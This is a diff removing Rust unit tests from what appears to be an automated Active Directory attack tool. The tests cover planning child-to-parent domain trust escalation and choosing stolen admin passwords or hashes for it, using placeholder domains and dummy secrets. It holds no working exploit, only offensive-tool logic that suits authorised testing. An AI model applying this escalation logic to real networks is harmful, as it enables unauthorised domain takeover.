-        let mut s = StateInner::new("op".into());
-        // child has DC IP, parent does not → skip.
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_child_with_no_dc_ip() {
-        let mut s = StateInner::new("op".into());
-        // parent has DC IP, child does not → skip.
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_already_processed_dedup() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.mark_processed(DEDUP_TRUST_FOLLOW, "raise_child:child.contoso.local".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    // --- build_child_to_parent_work_path_b ----------------------------
-
-    #[test]
-    fn path_b_emits_when_explicit_trust_matches_candidate() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        // Explicit parent_child trust.
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "parent_child".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
-        );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let work = build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new());
-        assert_eq!(work.len(), 1);
-        assert_eq!(work[0].1, "child.contoso.local");
-        assert_eq!(work[0].2, "contoso.local");
-    }
-
-    #[test]
-    fn path_b_skips_when_key_already_in_existing() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "parent_child".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
-        );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let existing: HashSet<String> = ["raise_child:child.contoso.local".to_string()]
-            .into_iter()
-            .collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &existing).is_empty());
-    }
-
-    #[test]
-    fn path_b_skips_non_parent_child_trusts() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "forest".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
-        );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new()).is_empty());
-    }
-
-    #[test]
-    fn path_b_returns_empty_when_no_trusts() {
-        let s = StateInner::new("op".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new()).is_empty());
-    }
-
-    // --- find_child_to_parent_admin_cred ------------------------------
-
-    #[test]
-    fn find_admin_cred_prefers_password() {
-        let mut s = StateInner::new("op".into());
-        s.credentials
-            .push(make_admin_cred("P@ss!", "child.contoso.local"));
-        s.hashes
-            .push(make_admin_hash("child.contoso.local", "deadbeef"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert_eq!(method, "password");
-        assert_eq!(payload.unwrap()["password"], "P@ss!");
-    }
-
-    #[test]
-    fn find_admin_cred_falls_back_to_hash() {
-        let mut s = StateInner::new("op".into());
-        s.hashes
-            .push(make_admin_hash("child.contoso.local", "deadbeef"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert_eq!(method, "hash");
-        let p = payload.unwrap();
-        assert_eq!(p["username"], "Administrator");
-        assert_eq!(p["admin_hash"], "deadbeef");
-    }
-
-    #[test]
-    fn find_admin_cred_skips_non_admin_credential() {
-        let mut s = StateInner::new("op".into());
-        let mut c = make_admin_cred("P@ss!", "child.contoso.local");
-        c.is_admin = false;
-        s.credentials.push(c);
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
-    }
-
-    #[test]
-    fn find_admin_cred_skips_empty_password() {
-        let mut s = StateInner::new("op".into());
-        let c = make_admin_cred("", "child.contoso.local");
-        s.credentials.push(c);
-        let (payload, _) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-    }
-
-    #[test]
-    fn find_admin_cred_filters_by_domain() {
-        let mut s = StateInner::new("op".into());
-        s.credentials
-            .push(make_admin_cred("P@ss!", "fabrikam.local"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
-    }
-
-    #[test]
-    fn find_admin_cred_returns_none_when_both_empty() {
-        let s = StateInner::new("op".into());
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
-    }
-
     // --- sweep_stale_forge_in_flight -----------------------------------
 
     /// Simulate "in flight for longer than allowed" by offsetting the start
@@ -4036,8 +3092,10 @@ mod tests {
 
     #[test]
     fn vuln_driven_skips_non_forest_trust_vuln_types() {
-        // child_to_parent is intra-forest; raise_child handles it via a
-        // different path. The vuln-driven helper must not pick those up.
+        // The vuln-driven fallback is scoped to cross-forest
+        // (`forest_trust_escalation`) — intra-forest (`child_to_parent`)
+        // work is built reliably by the hash-iteration path and would
+        // double-emit if also picked up here.
         let mut s = StateInner::new("op".into());
         s.hashes.push(make_trust_hash(
             "child.contoso.local",
